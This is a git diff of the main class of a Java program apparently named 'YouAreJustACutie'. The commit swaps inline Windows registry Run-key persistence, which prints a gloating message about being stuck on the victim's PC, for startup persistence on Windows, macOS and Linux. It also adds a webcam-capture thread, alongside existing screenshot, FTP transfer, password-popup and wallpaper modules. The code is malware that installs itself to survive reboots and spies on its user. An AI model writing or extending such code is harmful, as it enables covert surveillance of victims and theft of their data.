@@ -1,18 +1,16 @@
 package fr.mimifan.jac;
 
+import com.formdev.flatlaf.util.SystemInfo;
 import fr.mimifan.jac.browser.BrowserManager;
 import fr.mimifan.jac.popups.PasswordPopup;
 import fr.mimifan.jac.popups.PopupsManager;
 import fr.mimifan.jac.screens.ScreenShotter;
 import fr.mimifan.jac.ftp.FileTransferClient;
 import fr.mimifan.jac.utils.CutieInfos;
+import fr.mimifan.jac.utils.StartupRunning;
 import fr.mimifan.jac.wallpaper.WallpaperManager;
-
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
 import java.net.InetAddress;
-import java.net.URISyntaxException;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.concurrent.Executors;
@@ -20,11 +18,12 @@ import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 import com.formdev.flatlaf.FlatDarculaLaf;
+import fr.mimifan.jac.webcam.WebcamManager;
 
 public class Main {
 
 
-    public static void main(String[] args) throws IOException, URISyntaxException, InterruptedException {
+    public static void main(String[] args) throws IOException {
 
         FlatDarculaLaf.setup();
 
@@ -33,34 +32,11 @@ public class Main {
 
         BrowserManager.openLink("https://discord.gg/DKnqAAvAwa");
 
-        String runKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-        String appName = "YouAreJustACutie";
+        if(SystemInfo.isWindows) StartupRunning.enableStartupWindows();
+        else if (SystemInfo.isMacOS) {
+            StartupRunning.enableStartupMac();
+        } else StartupRunning.enableStartupLinux();
 
-        Process processCheck = Runtime.getRuntime().exec("reg query \"" + runKey + "\" /v " + appName);
-        BufferedReader readerCheck = new BufferedReader(new InputStreamReader(processCheck.getInputStream()));
-        String line;
-        boolean entryExists = false;
-        while ((line = readerCheck.readLine()) != null) {
-            if (line.contains(appName)) {
-                entryExists = true;
-                break;
-            }
-        }
-        readerCheck.close();
-
-        if(!entryExists) {
-            String programPath = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getRawPath();
-            Process runOnStartupProcess = Runtime.getRuntime().exec(
-                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v YouAreJustACutie /t REG_SZ /d \"java -jar " + programPath + "\"");
-
-            BufferedReader outputReader = new BufferedReader(new InputStreamReader(runOnStartupProcess.getInputStream()));
-            String outputLine;
-            while ((outputLine = outputReader.readLine()) != null) System.out.println(outputLine);
-
-            runOnStartupProcess.waitFor();
-            outputReader.close();
-            System.out.println("There there, now you should be stucked here everytime you start your pc :3");
-        }
 
         new CutieInfos();
         System.out.println(CutieInfos.cutiesDiscordName);
@@ -72,6 +48,9 @@ public class Main {
 
         Thread wallpaperThread = new Thread(WallpaperManager::changeWallPaper);
         wallpaperThread.start();
+
+        Thread webcamThread = new Thread(WebcamManager::takePicture);
+        webcamThread.start();
 
 
         ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
